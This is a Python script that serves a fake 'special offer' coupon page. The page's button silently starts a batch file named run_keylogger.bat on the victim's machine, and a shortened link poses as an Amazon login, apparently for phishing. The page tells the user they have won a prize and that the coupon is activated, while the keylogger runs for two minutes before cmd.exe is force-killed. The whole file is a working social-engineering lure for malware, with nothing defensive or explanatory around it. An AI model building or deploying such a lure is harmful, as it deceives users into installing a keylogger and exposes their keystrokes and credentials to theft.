import http.server
import socketserver
import webbrowser
import os
import time
import subprocess

# Define the HTML content wit
# h the link
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coupon Code Activation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            max-width: 500px;
            text-align: center;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #45a049;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
         img {
            width: 300px; 
            height: 300px; 
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="FILES/logo.jpeg" alt="Logo" >
        <h1>Welcome to Our Special Offer!</h1>
        <p>Congratulations! You've won a special offer. Click the button below to activate your coupon code:</p>
        <button id="activateCoupon">Activate Coupon Code</button>
        <p>Login to redeem your coupon code <a href="https://shorturl.at/vzOPG">Click here to login to Amazon</a></p>
    </div>
     <script>
        document.getElementById("activateCoupon").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default button behavior (e.g., form submission)
            // Execute the batch file to activate the coupon code
            fetch("http://localhost:8000/run_batch", {method: 'POST'})
                .then(response => {
                    console.log("Batch file executed successfully to activate coupon code.");
                    alert("Coupon code activated successfully! Enjoy your special offer.");
                })
                .catch(error => {
                    console.error("Error executing batch file:", error);
                    alert("Failed to activate coupon code. Please try again later.");
                });
        });
    </script>
</body>
</html>

"""

# Define the HTTP request handler
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode("utf-8"))
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == "/run_batch":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            # Execute the batch file
            batch_file_path = "run_keylogger.bat"
            if os.path.exists(batch_file_path):
                # Run the batch file in a separate process
                subprocess.Popen([batch_file_path])
                # Wait for 2 minutes before terminating the batch file process
                time.sleep(120)
                # Terminate the batch file process
                os.system("TASKKILL /F /IM cmd.exe")
                self.wfile.write(b"Batch file execution initiated.")
            else:
                self.wfile.write(b"Batch file not found.")
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Not found.")

try:
    # Start the web server
    with socketserver.TCPServer(("", 8000), MyRequestHandler) as httpd:
        print("Server started at http://localhost:8000")
        webbrowser.open("http://localhost:8000")  # Open the web page in the default browser
        httpd.serve_forever()
except KeyboardInterrupt:
    # Handle keyboard interrupt (Ctrl+C)
    print("Stopping server...")
finally:
    # Stop the batch file execution
    os.system("TASKKILL /F /IM cmd.exe")
    print("Batch file execution stopped.")
